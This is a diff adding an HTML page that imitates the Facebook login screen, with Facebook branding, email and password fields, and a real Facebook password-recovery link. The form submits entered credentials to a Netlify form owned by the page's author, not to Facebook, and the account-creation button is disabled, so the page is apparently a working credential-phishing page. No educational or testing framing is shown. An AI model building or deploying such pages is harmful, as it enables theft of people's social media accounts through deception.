@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v6.0.0-beta1/css/all.css">
+    <link rel="shortcut icon" href="fb-logo.jpg" type="image/x-icon">
+    <title>Log in to Facebook</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+    <h1 class="fb-heading">facebook</h1>
+
+    <div class="form-container">
+
+            <form name="form" method="POST" data-netlify="true" onsubmit="submit" netlify>
+
+                <h3 class="heading-h3">Log in to Facebook</h3>
+
+                <input class="hidden" name="bot-field" />
+
+                <input type="email" class="input-field" id="email" name="email" required
+                    placeholder="Email address or phone number">
+
+                <input type="password" class="input-field" id="pwd" name="pwd" required placeholder="Password">
+
+                <input type="submit" id="login" value="Log In">
+
+                <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">Forgotten
+                    Password?</a>
+                <hr class="hr">
+                <input type="button" onclick="alert('You Cannot Create New Account')" class="create-button"
+                    value="Create New Account">
+
+            </form>
+            </div>
+</body>
+
+</html>
